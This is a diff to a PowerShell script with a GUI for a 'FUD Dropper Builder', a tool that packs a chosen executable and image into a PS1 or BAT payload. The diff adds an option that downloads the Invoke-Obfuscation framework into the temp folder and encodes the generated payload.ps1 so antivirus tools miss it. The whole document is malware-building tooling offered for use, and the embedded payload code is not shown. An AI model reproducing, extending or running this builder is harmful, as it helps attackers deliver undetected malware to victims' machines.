@@ -48,7 +48,7 @@ $inputXML = @'
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
         xmlns:local="clr-namespace:GUI_TEST"
         mc:Ignorable="d"
-        Title="FUD Dropper Builder | K.Dot#4044" Height="470" Width="818" WindowStyle="SingleBorderWindow" ResizeMode="NoResize">
+        Title="FUD Dropper Builder | K.Dot#4044" Height="470" Width="818" WindowStyle="ThreeDBorderWindow" ResizeMode="NoResize">
     <Window.Resources>
         <ResourceDictionary>
             <Style x:Key="CustomButtonStyle" TargetType="{x:Type Button}">
@@ -76,7 +76,7 @@ $inputXML = @'
         </TextBox>
         <TextBox x:Name="IMAGE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,90,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2" FontSize="18"/>
         <TextBox x:Name="EXE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,171,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2" FontSize="18"/>
-        <TextBox x:Name="OUTPUT_BOX" HorizontalAlignment="Left" Height="207" Margin="306,217,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="484" Grid.ColumnSpan="2" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
+        <TextBox x:Name="OUTPUT_BOX" VerticalScrollBarVisibility="Auto" HorizontalAlignment="Left" Height="207" Margin="306,217,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="484" Grid.ColumnSpan="2" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
         <Label Content="IMAGE PATH" HorizontalAlignment="Left" Height="29" Margin="10,61,0,0" VerticalAlignment="Top" Width="423" FontFamily="Arial Black"/>
         <Label Content="EXE PATH" HorizontalAlignment="Left" Height="29" Margin="10,142,0,0" VerticalAlignment="Top" Width="423" FontFamily="Segoe UI Black"/>
         <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="516,189,0,0" VerticalAlignment="Top" Width="64" FontFamily="Impact" FontSize="18"/>
@@ -85,6 +85,8 @@ $inputXML = @'
         <Button x:Name="ps1_button" Content="Build PS1" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="207" Margin="10,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Text Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
         <Button x:Name="Bat_Button" Content="Build BAT" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="207" Margin="155,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
         <Image HorizontalAlignment="Left" Height="189" Margin="604,10,0,0" VerticalAlignment="Top" Width="186" Source="comethazine.png"/>
+        <TextBox x:Name="OBF_TEXT_TF" HorizontalAlignment="Left" Height="21" Margin="92,123,0,0" TextWrapping="Wrap" Text="False" VerticalAlignment="Top" Width="118"/>
+        <Button x:Name="OBFUSCATE_TF" Content="Obfuscate" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="43" Margin="222,123,0,0" VerticalAlignment="Top" Width="123" FontFamily="Sitka Small Semibold" FontSize="20" BorderBrush="#FF1AFB00" Background="Black" BorderThickness="4,4,4,4" Foreground="White"/>
     </Grid>
 </Window>
 '@
@@ -105,6 +107,21 @@ function New-random_string {
         $result += $chars[$rand]
     }
     return $result
+}
+
+function Invoke-PowershellOBF {
+    param (
+        [string]$file_location
+    )
+    $OBFUSCATOR_URL = "https://github.com/danielbohannon/Invoke-Obfuscation/archive/refs/heads/master.zip"
+    $OBFUSCATOR_PATH = "$env:temp\Invoke-Obfuscation.zip"
+    $OBFUSCATOR_EXTRACT_PATH = "$env:temp\Invoke-Obfuscation"
+    Start-BitsTransfer -Source $OBFUSCATOR_URL -Destination $OBFUSCATOR_PATH
+    Expand-Archive -Path $OBFUSCATOR_PATH -DestinationPath $OBFUSCATOR_EXTRACT_PATH
+    $command = "cd Invoke-Obfuscation-master ; Import-Module ./Invoke-Obfuscation.psd1 ; Invoke-Obfuscation -ScriptPath $file_location -Command 'Encoding\\6, Copy'"
+    Invoke-Command -ScriptBlock { $command }
+    $clipboard_output = Get-Clipboard
+    $clipboard_output | Out-File -FilePath $file_location
 }
 
 function Invoke-obfuscate {
@@ -174,6 +191,10 @@ function build {
     $var_OUTPUT_BOX.Text += "Writing payload to file...`n"
     $EMBEDDED_CODE = $EMBEDDED_CODE.Replace("test_image.jpg", $image_name)
     $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\output\payload.ps1"
+    if ($type -eq "ps1" -and $var_OBF_TEXT_TF.Text -eq "True") {
+        $var_OUTPUT_BOX.Text += "Obfuscating powershell code...`n"
+        Invoke-PowershellOBF "$working_dir\output\payload.ps1"
+    }
     if ($type -eq "bat") {
         $var_OUTPUT_BOX.Text += "Obfuscating batch code...`n"
         $ps1_code = $EMBEDDED_CODE.Split("`n")
@@ -225,15 +246,9 @@ $Window.add_Loaded({
 
 $xaml.SelectNodes("//*[@Name]") | ForEach-Object {
     try {
-        Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name) -ErrorAction Stop
+        Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name) -ErrorAction SilentlyContinue
     } catch {
-        try {
-            #get value of checkbox instead of button, etc
-            Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name).IsChecked -ErrorAction Stop
-        }
-        catch {
-            throw "Error: $($_.Name) not found"
-        }
+        $null
     }
 }
 Get-Variable var_* > $null
@@ -277,6 +292,16 @@ $var_Bat_Button.add_Click({
 
 $var_OUTPUT_BOX.add_TextChanged({
     $var_OUTPUT_BOX.ScrollToEnd()
+})
+
+$var_OBFUSCATE_TF.add_click({
+    $current_text = $var_OBF_TEXT_TF.Text
+    if ($current_text -eq 'True') {
+        $var_OBF_TEXT_TF.Text = 'False'
+    }
+    else {
+        $var_OBF_TEXT_TF.Text = 'True'
+    }
 })
 
 $var_OUTPUT_BOX.Text += "Successfully Started`n"
